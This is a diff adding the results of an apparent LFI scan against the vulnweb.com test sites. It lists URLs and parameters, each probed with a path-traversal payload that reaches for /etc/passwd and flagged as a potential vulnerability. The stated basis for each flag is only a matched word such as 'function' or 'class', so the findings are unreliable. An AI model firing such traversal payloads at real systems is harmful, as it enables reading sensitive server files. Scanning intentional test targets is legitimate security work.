@@ -1,0 +1,115 @@
+LFI Vulnerability Scan Results
+=======================================
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=3&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+Parameter: cat
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testphp.vulnweb.com?pp=12
+Parameter: pp
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: function
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Templatize.asp?item=html/about.html
+Parameter: item
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
+Parameter: RetURL
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F
+Parameter: RetURL
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/showforum.asp?id=0
+Parameter: id
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/showforum.asp?id=1
+Parameter: id
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/showforum.asp?id=2
+Parameter: id
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml
+Parameter: RetURL
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml
+Parameter: RetURL
+Payload: ../../../../../../../etc/passwd
+Status: Potential LFI Vulnerability
+Analysis: LFI pattern detected: class
+-----------------------------
+
